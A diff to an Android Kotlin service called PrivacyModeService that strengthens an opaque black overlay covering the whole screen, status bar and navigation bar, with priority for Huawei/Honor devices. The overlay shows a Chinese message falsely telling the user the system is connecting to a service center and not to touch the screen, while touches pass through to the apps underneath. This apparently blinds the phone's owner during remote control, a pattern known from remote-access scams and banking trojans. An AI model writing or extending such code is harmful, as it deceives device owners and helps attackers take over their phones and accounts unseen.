@@ -275,12 +275,19 @@ class PrivacyModeService : Service() {
         val deviceType = detectDeviceType()
         
         // Create black overlay view with warning text
+        // Use solid black color - Color.BLACK is #FF000000 (fully opaque)
         privacyView = TextView(this).apply {
-            setBackgroundColor(Color.argb(255, 0, 0, 0)) // 100% opacity: Completely black
+            // Use multiple layers to ensure complete opacity on EMUI/HarmonyOS
+            setBackgroundColor(Color.BLACK) // #FF000000 - Pure solid black
+            // Set alpha to ensure no transparency
+            alpha = 1.0f
             text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
             setTextColor(Color.WHITE)
             textSize = 28f
             gravity = Gravity.CENTER
+            
+            // Set solid black background drawable for extra opacity assurance
+            background = android.graphics.drawable.ColorDrawable(Color.BLACK)
             
             // Hide system UI (navigation bar and status bar) to ensure full screen coverage
             @Suppress("DEPRECATION")
@@ -292,6 +299,14 @@ class PrivacyModeService : Service() {
                 android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                 android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
             )
+            
+            // For Android 11+, use WindowInsetsController
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                setOnApplyWindowInsetsListener { view, insets ->
+                    // Consume all insets to ensure we draw over system bars
+                    insets
+                }
+            }
         }
         
         // Get screen dimensions - use Point for more reliable size
@@ -303,18 +318,22 @@ class PrivacyModeService : Service() {
         Log.d(TAG, "DEBUG_PRIVACY: Screen size: ${screenWidth}x${screenHeight}")
         
         // Use MUCH larger dimensions to guarantee full coverage including status bar, nav bar, and curved edges
-        // Increase padding significantly for curved screen devices (common in Chinese OEM phones)
-        val overlayWidth = screenWidth + 800  // Extra padding for curved edges
-        val overlayHeight = screenHeight + 800  // Extra padding for status bar, nav bar, and notch
+        // Increase padding significantly for curved screen devices and EMUI/HarmonyOS status bar issues
+        val overlayWidth = screenWidth + 1000  // Extra padding for curved edges
+        val overlayHeight = screenHeight + 1000  // Extra padding for status bar, nav bar, and notch
         
-        // Build window flags - enhanced for better coverage
+        // Build window flags - enhanced for better coverage on Huawei/Honor devices
+        // These flags ensure the overlay draws over system UI elements
+        @Suppress("DEPRECATION")
         val windowFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or  // Allow touches to pass through
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or  // Draw beyond screen boundaries
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                 WindowManager.LayoutParams.FLAG_FULLSCREEN or
                 WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or  // Cover inset areas
-                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS  // Cover system bars
+                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS or // Cover system bars
+                WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS or  // Draw over status bar
+                WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION  // Draw over navigation bar
         
         Log.d(TAG, "DEBUG_PRIVACY: Window flags: $windowFlags")
         
@@ -338,13 +357,23 @@ class PrivacyModeService : Service() {
                 PixelFormat.OPAQUE
             ).apply {
                 // Position with negative offset to cover status bar (top) and edges
+                // Increased negative offset for better status bar coverage on Huawei/Honor
                 gravity = Gravity.TOP or Gravity.START
-                x = -400  // Offset to ensure left edge and curved edge coverage
-                y = -400  // Large negative to cover status bar and any notch
+                x = -500  // Offset to ensure left edge and curved edge coverage
+                y = -500  // Large negative to cover status bar and any notch
                 
                 // Support for notch/cutout displays (Android P+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                     layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
+                }
+                
+                // Set dimAmount to ensure no transparency issues
+                dimAmount = 1.0f
+                
+                // For EMUI/HarmonyOS, ensure we're above status bar
+                if (deviceType == DeviceType.HUAWEI_HONOR) {
+                    // Extend even further up for status bar coverage
+                    y = -600
                 }
             }
             
@@ -383,18 +412,30 @@ class PrivacyModeService : Service() {
                 }
             }
             DeviceType.HUAWEI_HONOR -> {
-                // Huawei/Honor: Try both, accessibility first then application
-                Log.d(TAG, "DEBUG_PRIVACY: Using HUAWEI/HONOR window type strategy")
+                // Huawei/Honor: Use TYPE_SYSTEM_ERROR for highest z-order to cover status bar
+                // Then fall back to accessibility and application overlays
+                Log.d(TAG, "DEBUG_PRIVACY: Using HUAWEI/HONOR window type strategy (enhanced for status bar)")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    @Suppress("DEPRECATION")
                     listOf(
+                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,  // Highest z-order, covers everything
+                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, // Also high z-order
                         WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                         WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                     )
                 } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
+                    @Suppress("DEPRECATION")
+                    listOf(
+                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
+                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                    )
                 } else {
                     @Suppress("DEPRECATION")
-                    listOf(WindowManager.LayoutParams.TYPE_PHONE)
+                    listOf(
+                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
+                        WindowManager.LayoutParams.TYPE_PHONE
+                    )
                 }
             }
             DeviceType.XIAOMI_MIUI -> {
